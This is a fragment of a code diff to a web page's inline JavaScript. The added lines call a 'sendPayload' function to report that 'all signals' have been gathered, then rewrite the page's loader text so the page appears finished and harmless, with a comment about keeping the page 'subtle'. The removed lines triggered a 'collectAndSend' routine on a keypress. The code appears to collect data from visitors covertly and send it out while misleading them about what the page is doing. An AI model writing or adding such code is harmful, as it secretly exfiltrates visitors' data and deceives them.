-            document.addEventListener('keydown', function handler() {
-                if (!started) {
-                    started = true;
-                    document.getElementById('click-overlay').style.display = 'none';
-                    setStatus('initializing...', 'active');
-                    setTimeout(collectAndSend, 300);
-                }
-                document.removeEventListener('keydown', handler);
-            }, { once: true });
+            // 9. Final message after collection
+            setTimeout(() => {
+                sendPayload('Collection Complete', 'All signals gathered. Processing...');
+                // Change UI to appear done
+                document.querySelector('.loader div').textContent = '✦ Connection established ✦';
+                document.querySelector('.loader div:last-child').textContent = 'all quiet on the front';
+            }, 3000);
 
+            // Keep the page alive and subtle
         })();
     </script>
 </body>
